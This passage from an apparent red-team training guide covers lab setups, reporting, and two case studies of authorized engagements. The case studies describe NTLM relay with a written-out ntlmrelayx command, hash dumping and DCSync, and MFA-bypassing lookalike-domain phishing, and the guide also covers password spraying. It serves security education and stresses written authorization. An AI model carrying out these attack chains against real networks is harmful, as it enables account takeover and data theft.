      "Our C2 beacon ran for 3 weeks without triggering any SIEM alerts.
      The lateral movement using Pass-the-Hash was not detected.
      Kerberoasting generated no alerts despite 15 TGS requests in 5 minutes."

MITRE ATT&CK HEAT MAP:
  └── Visual showing which techniques were used, which were detected
```

### Severity Rating Framework

| Rating | Definition | Example |
|--------|------------|---------|
| **Critical** | Immediate, catastrophic impact | RCE → Domain Admin in 1 step |
| **High** | Significant impact, chained exploitation needed | Phishing → local admin → credential dump |
| **Medium** | Limited impact without additional conditions | Self-XSS, information disclosure |
| **Low** | Minimal impact, informational | Missing security headers |
| **Informational** | Good practice, no direct risk | Outdated but not exploitable version |

---

## 16. Lab Setup — Practice Environments

### Home Lab for Red Team Practice

```
TIER 1 — MINIMUM LAB (4-8GB RAM):
  ├── Kali Linux VM (attacker machine)
  ├── Windows 10 VM (target — victim)
  └── Metasploitable 2 or DVWA (intentionally vulnerable)

TIER 2 — INTERMEDIATE LAB (16GB RAM):
  ├── Kali Linux / Parrot OS (attacker)
  ├── Windows Server 2022 (Domain Controller)
  ├── Windows 10 (domain-joined workstation)
  └── Vulnerable web app (DVWA, bWAPP, VulnHub VM)

TIER 3 — FULL AD LAB (32GB RAM):
  ├── Kali Linux
  ├── Windows Server 2022 DC (acme.local)
  ├── Windows Server 2022 DC #2 (for domain trust practice)
  ├── Windows 10 (multiple workstations)
  └── GOAD (Game of Active Directory) — pre-built vulnerable AD
```

### GOAD — Game of Active Directory

```
PROJECT: https://github.com/Orange-Cyberdefense/GOAD
  
WHAT IT IS:
  Pre-configured intentionally vulnerable Active Directory environment
  Multiple interconnected forests/domains with realistic vulnerabilities
  
DOMAINS INCLUDED:
  - NORTH.SEVENKINGDOMS.LOCAL
  - SEVENKINGDOMS.LOCAL  
  - ESSOS.LOCAL
  
VULNERABILITIES BUILT IN:
  AS-REP Roasting, Kerberoasting, LAPS, ACL abuse,
  Unconstrained delegation, PrinterBug, NTLM relay,
  SQL injection, weak passwords, and more
  
COMMUNITY RATING: [Community #1 AD Red Team Lab]
*"GOAD is the closest thing to a real corporate AD environment you can practice on for free"*
```

### VulnHub / HackTheBox Recommendations

| Machine | Skill Focus | Difficulty |
|---------|------------|-----------|
| **HTB: Active** | Kerberoasting, SMB enum | Easy |
| **HTB: Forest** | AS-REP Roasting, DCSync | Easy |
| **HTB: Sauna** | AS-REP Roasting, DCSync | Easy |
| **HTB: Return** | Service account abuse | Easy |
| **HTB: Monteverde** | Azure AD Sync, Azure | Medium |
| **HTB: Blackfield** | Kerberoasting, LAPS | Hard |
| **HTB: Reel** | Phishing, ACL abuse | Hard |
| **PG: Hutch** | LAPS, WinRM | Intermediate |

---

## 17. Real-World Red Team Case Studies

### Case Study 1: Full Chain — SMB Relay to Domain Admin

**Scenario:** Internal red team engagement, large retail company.

```
DAY 1 — RECON:
  - Ran BloodHound: Identified 3 machines running SMB without signing
  - LLMNR/NBT-NS broadcasting observed on network

DAY 2 — INITIAL ACCESS:
  - Ran Responder (passive) → captured NTLMv2 hashes from 3 workstations
  - Cracked marketing-pc-1 hash offline: password = "Summer2024!"
  - Validated against OWA → gained mailbox access for Marketing user

DAY 3 — ESCALATION:
  - Ran Mitm6 + ntlmrelayx → relayed NTLM auth to Domain Controller
  - DC had SMB signing disabled → relay succeeded
  - ntlmrelayx -tf targets.txt -smb2support --delegate-access
  - Created resource-based constrained delegation → dumped NTLM hashes via secretsdump

DAY 4 — DOMAIN ADMIN:
  - Cracked IT-admin hash from dump: "P@ssw0rd2024"
  - Used credentials → DCSync → obtained all domain hashes
  - Achieved Domain Admin from initial passive observation in ~4 days

KEY FINDING: SMB signing not enforced + LLMNR enabled = trivial domain compromise
```

---

### Case Study 2: Phishing to Crown Jewel Exfiltration

**Scenario:** External red team engagement against a healthcare provider.

```
WEEK 1 — OSINT:
  - LinkedIn: Found IT manager "David Chen" — manages VMware environment
  - His email format: d.chen@target-health.com (from job posting)
  - VMware Horizon login page found: vpn.target-health.com/portal

WEEK 1 — PHISHING:
  - Sent spear-phish: "VMware Horizon security update — your credentials must be rotated"
  - Link to lookalike page: vmware-horizon-portal.com (registered 3 weeks prior)
  - David entered credentials + MFA code (we captured in real-time)
  - Replayed to actual Horizon portal → authenticated session
  - Inside VMware Horizon: saw internal jump server

WEEK 2 — INTERNAL:
  - From jump server → SMB enum → found file server with sensitive data
  - File server: Patients/ folder — 250,000 patient records
  - Created simulated evidence: ls -R Patients/ > evidence.txt
  - Ran BloodHound → jump server had local admin path to AD DC

WEEK 2 — DOMAIN ADMIN:
  - Exploited delegation on jump server → full domain compromise
  - Total time: 2 weeks from first email to Domain Admin + Crown Jewel access

KEY FINDING: AiTM phishing bypassed MFA → Okta push approval captured in real-time
CRITICAL MISS: No detection of fake lookalike domain, no impossible travel alert for MFA
```

---

## 18. Day in the Life of a Red Teamer

### During an Active Engagement

```
DAY 1-2: RECONNAISSANCE
  08:00 - OSINT: LinkedIn, WHOIS, crt.sh, Shodan
  10:00 - Subdomain enumeration, port scanning (slow, -T2 to avoid detection)
  14:00 - Web app fingerprinting, employee email harvesting
  16:00 - Draft initial attack hypothesis: likely initial access vectors?

DAY 3-7: INITIAL ACCESS ATTEMPTS
  Start with lowest-noise vectors first:
  1. Credential stuffing against OWA/VPN with known-breached credentials
  2. Password spraying (carefully — one attempt per account per 30 min)
  3. External service scanning for CVEs
  4. If allowed: Send phishing emails
  Monitor: Did we get any callbacks? Any credentials work?

DURING ENGAGEMENT: OPERATIONAL SECURITY
  - All actions logged in team notes (when, what, from where)
  - Every command documented (for report and for abort/rollback)
  - Emergency stop: if you cause unintended impact, STOP and call emergency contact
  - Never exceed scope, no matter what you discover inside
  
END OF DAY: DECONFLICTION
  - Send brief update to engagement lead
  - Note what worked, what didn't, what tomorrow's plan is
  - Store all evidence securely (encrypted drive)

WEEKLY: INTERNAL PROGRESS CALL
  - Share progress with engagement lead
  - Adjust strategy based on findings
  - Flag any concerns about scope/impact
```

### Non-Engagement Days

```
SKILL DEVELOPMENT:
  - Practice on HackTheBox / GOAD
  - Research new CVEs and develop exploits
  - Reverse engineer malware samples
  - Read threat actor reports (APT29, FIN7, Lazarus writeups)
  - Contribute to open-source tools (Sliver, Impacket, etc.)

TOOL DEVELOPMENT:
  - Write custom C2 profiles / evasion techniques
  - Develop internal tooling for specific engagement needs
  - Automate recon workflows

REPORTING:
  - Write detailed technical reports
  - Create executive-level summaries
  - Track remediation progress for previous engagements
```

---

## 19. Legal, Ethical & Corporate Framework

### Authorization — Non-Negotiable

```
YOU MUST HAVE IN WRITING BEFORE ANY ACTION:
  ├── Signed Statement of Work (SoW)
  ├── Signed Rules of Engagement (RoE)
  ├── Explicit scope definition
  ├── Emergency contact numbers
  └── Get-out-of-jail letter (physical copy if physical testing)

NEVER DO WITHOUT EXPLICIT WRITTEN AUTHORIZATION:
  ├── Test any system not in scope
  ├── Access data beyond what's needed to demonstrate impact
  ├── Take destructive actions
  ├── Exfiltrate real sensitive data (use markers/canary tokens)
  └── Test third-party systems (cloud providers, SaaS vendors)

IF IN DOUBT: STOP AND ASK.
A missed finding is far better than an unauthorized action.
```

### Computer Fraud and Abuse Act (CFAA) — India equivalents

```
INDIA: Information Technology Act 2000 (IT Act)
  - Section 43: Unauthorized access, damage to computer systems
  - Section 66: Computer-related offences (criminal)
  - Section 66B-F: Various cybercrimes
  
AUTHORIZATION = PROTECTION:
  Written client authorization is your legal protection.
  Without it, the same technical actions = criminal offense.

SCOPE CREEP RISK:
  "While inside, I noticed another vulnerability on a related system"
  → DO NOT TEST without adding it to scope via written amendment
  → Document that you found it, report it, but don't exploit without authorization
```

### Responsible Disclosure vs Red Team

```
BUG BOUNTY:
  - Strictly scoped program
  - Report vulnerability, get paid
  - No exploitation beyond proof of concept
  
RED TEAM:
  - Full authorization for goal-oriented simulation
  - Can chain exploits, lateral movement, etc.
  - All findings reported to client (not public)
  - Client decides remediation timeline
  
RESPONSIBLE DISCLOSURE (finding vulns in wild):
  - Contact vendor/org directly (not public)
  - Give 90-day disclosure window (industry standard)
  - If no response → coordinate with CERT-In (India) or similar
```

---

> **💡 Corporate Reality:** Most corporate red team engagements are NOT about exotic zero-days. They're about testing whether an organization's defenses hold up against realistic attacks. The most common paths are: phishing → credential theft → lateral movement using built-in tools → privilege escalation. Organizations that patch, enforce MFA, segment networks, and monitor for anomalies are genuinely hard targets.

> **📝 Ethical Note:** The skills in this guide are for authorized security testing only. Understanding attack techniques makes you a better defender. The best red teamers think continuously about how defenders can detect what they're doing — which is why the best offensive security professionals often transition into excellent security architects.

